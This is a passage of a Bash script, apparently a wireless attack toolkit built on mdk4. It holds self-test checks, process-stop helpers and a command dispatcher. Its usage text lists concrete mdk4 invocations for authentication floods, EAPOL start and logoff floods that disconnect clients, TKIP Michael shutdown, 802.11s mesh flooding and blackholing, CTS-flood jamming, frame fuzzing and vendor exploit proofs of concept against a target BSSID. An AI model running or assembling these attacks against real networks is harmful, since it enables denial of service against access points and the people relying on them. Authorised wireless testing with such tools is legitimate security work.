    chk michael-note-tkip  "$(grep -c 'TKIP' "$st/out_michael")"    "1"
    chk michael-note-qos   "$(grep -c 'TKIP with the QoS extension' "$st/out_michael")" "1"
    chk michael-note-rare  "$(grep -c 'rarely' "$st/out_michael")"  "1"
    chk michael-no-success "$(grep -ciE '^(OK|SUCCESS)' "$st/out_michael")" "0"

    # No BSSID is a usage error, not a broadcast.
    verb_probe michael_none bf_michael_shutdown "" 5
    chk michael-no-bssid-rc "$(cat "$st/rc_michael_none")" "2"
    chk michael-no-bssid-ran "$([[ -f "$st/args_michael_none.txt" ]] && echo ran || echo refused)" "refused"
    verb_probe auth_none bf_auth_flood "" 5
    chk auth-no-bssid-rc  "$(cat "$st/rc_auth_none")" "2"

    # ── a missing monitor interface is refused, and the message names it ──
    (
        export PATH="$st/bin_nomon:$PATH" STUB_ARGS="$st/args_nomon.txt"
        BF_MON_FILE="$st/does_not_exist"
        bf_auth_flood AA:BB:CC:DD:EE:FF 5 > "$st/out_nomon" 2> "$st/err_nomon"
        printf '%s' "$?" > "$st/rc_nomon"
    )
    chk nomon-rc        "$(cat "$st/rc_nomon")" "3"
    chk nomon-names-it  "$(grep -c 'no monitor interface' "$st/err_nomon")" "1"
    chk nomon-names-where "$(grep -c "$st/does_not_exist" "$st/err_nomon")" "1"
    chk nomon-no-run    "$([[ -f "$st/args_nomon.txt" ]] && echo ran || echo refused)" "refused"
    chk nomon-no-argv   "$(grep -c '^CMD' "$st/out_nomon")" "0"

    rm -rf "$st"
    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

# ── verified stop ──
# Escalating signals; returns 0 ONLY once the pid is actually gone. Signals
# the process group first so forked children die with the leader. Stops that
# print STOPPED and delete the pidfile without this can strand a capture with
# no remaining handle to it, making the stop button useless.
stop_kill_pid() {
    local pid="$1" i
    # Liveness via /proc, NOT `kill -0`: for a root-owned process we get EPERM,
    # and treating that as "gone" made stops report success while nothing died.
    [[ -d "/proc/$pid" ]] || return 0
    kill -INT  "-$pid" 2>/dev/null || kill -INT  "$pid" 2>/dev/null
    for i in 1 2 3 4 5 6 7 8 9 10; do
        [[ -d "/proc/$pid" ]] || return 0
        sleep 0.2
    done
    kill -TERM "-$pid" 2>/dev/null || kill -TERM "$pid" 2>/dev/null
    for i in 1 2 3 4 5; do
        [[ -d "/proc/$pid" ]] || return 0
        sleep 0.2
    done
    kill -KILL "-$pid" 2>/dev/null || kill -KILL "$pid" 2>/dev/null
    sleep 0.3
    [[ -d "/proc/$pid" ]] && return 1
    return 0
}
# Kill everything matching a pgrep -f pattern, never this shell or its parent.
# Returns non-zero only if something matched and SURVIVED.
stop_sweep() {
    local pat="$1" sp rs=0 any=0
    # Exclude this process AND its whole ancestor chain. Excluding only $$ and
    # $PPID is not enough: when invoked via `timeout` or pkexec the caller's
    # shell is further up, and a cmdline substring match would kill it — a
    # pattern like "mitm6" matches the very command line running this stop.
    local -A _skip=()
    sp=$$
    while [[ -n "$sp" && "$sp" != "0" && "$sp" != "1" ]]; do
        _skip[$sp]=1
        sp=$(ps -o ppid= -p "$sp" 2>/dev/null | tr -d ' ')
        [[ -z "$sp" ]] && break
    done
    for sp in $(pgrep -f "$pat" 2>/dev/null); do
        [[ -n "${_skip[$sp]:-}" ]] && continue
        any=1
        stop_kill_pid "$sp" || rs=1
    done
    (( any )) && return $rs
    return 0
}

# stop_sweep() returns 0 both when it reaped a process and when nothing
# matched at all, so --stop could not tell "stopped one" from "nothing was
# running" and printed STOPPED 1 either way. This asks the only question that
# matters: is a previously-matching pid actually gone now?
bf_sweep_killed() {   # PATTERN -> 0 when at least one match was reaped
    local pat="$1" sp gone=0
    local -a before=()
    mapfile -t before < <(pgrep -f "$pat" 2>/dev/null)
    ((${#before[@]})) || return 1
    stop_sweep "$pat" || true
    for sp in "${before[@]}"; do
        [[ -d "/proc/$sp" ]] && continue
        gone=1
    done
    (( gone ))
}

bf_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --status-tsv)       bf_status_tsv ;;
        --list-ssids-tsv)   bf_list_ssids_tsv ;;
        --generate)         bf_generate_ssids "$@" ;;
        --generate-from)    bf_generate_targeted "$@" ;;
        --set-band)         bf_set_band "$@" ;;
        --set-mode)         bf_set_mode "$@" ;;
        --set-enc)          bf_set_enc "$@" ;;
        --start)            bf_start ;;
        --stop)             bf_stop ;;
        --auth-flood)       bf_auth_flood "$@" ;;
        --wids-confuse)     bf_wids_confuse "$@" ;;
        --michael-shutdown) bf_michael_shutdown "$@" ;;
        --eapol-flood)      bf_eapol_flood "$@" ;;
        --eapol-logoff)     bf_eapol_logoff "$@" ;;
        --mesh-flood)       bf_mesh_flood "$@" ;;
        --mesh-blackhole)   bf_mesh_blackhole "$@" ;;
        --cts-flood)        bf_cts_flood "$@" ;;
        --fuzz)             bf_fuzz "$@" ;;
        --vendor-poc)       bf_vendor_poc "$@" ;;
        --log)              bf_log_tail ;;
        --watch-clients)    bf_watch_clients "$@" ;;
        --watch-reset)      bf_watch_reset ;;
        --watch-hits-tsv)   bf_watch_hits_tsv ;;
        --selftest)         bf_selftest ;;
        *)
            cat >&2 <<EOF
Usage: $0 COMMAND
  --status-tsv
  --list-ssids-tsv
  --generate [COUNT]
  --generate-from SOURCE
  --set-band 2.4|5|6|hop
  --set-mode beacon|probe|both
  --set-enc open|wpa2|wpa3|owe|mixed
  --start
  --stop
  --auth-flood BSSID [DUR]           mdk4 a -a BSSID  (authentication DoS, bounded by DUR seconds, default 30)
  --wids-confuse [SSID|BSSID] [DUR]  mdk4 w -e SSID   (WIDS confusion; mdk4 has no broadcast form, a
                                      BSSID is resolved to an SSID from the newest recon scan)
  --michael-shutdown BSSID [DUR]     mdk4 m -t BSSID  (TKIP + QoS only, rarely works, see NOTE in output)
  --eapol-flood [DUR]                mdk4 e           (EAPOL-Start flood, keeps the AP busy with fake sessions)
  --eapol-logoff BSSID [DUR]         mdk4 e -t BSSID  (fake EAPOL Logoff, logs clients off the AP)
  --mesh-flood MESHID [DUR]          mdk4 s -n MESHID (802.11s: neighbour and route flooding)
  --mesh-blackhole MESHPOINT [DUR]   mdk4 s -b MAC    (802.11s: answer route requests with a perfect route)
  --cts-flood [DUR]                  mdk4 f -s c -m n (CTS frames to broadcast; NAV/DoS)
  --fuzz [DUR]                       mdk4 f -s a,b,p -m s,d,t,c  (packet fuzzer, multiple modifiers)
  --vendor-poc [BSSID] [DUR]         mdk4 x [-B BSSID](vendor implementation PoC tests from mdk4 pocs/)
  --log
  --watch-clients [INTERVAL]
  --watch-reset
  --watch-hits-tsv
  --selftest
EOF
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    WIFISTING_CLI=1
    declare -F info >/dev/null 2>&1 || info() { printf '[info] %s\n' "$*" >&2; }
    command -v err  >/dev/null 2>&1 || err()  { printf '[err]  %s\n' "$*" >&2; }
    bf_cli_main "$@"
fi
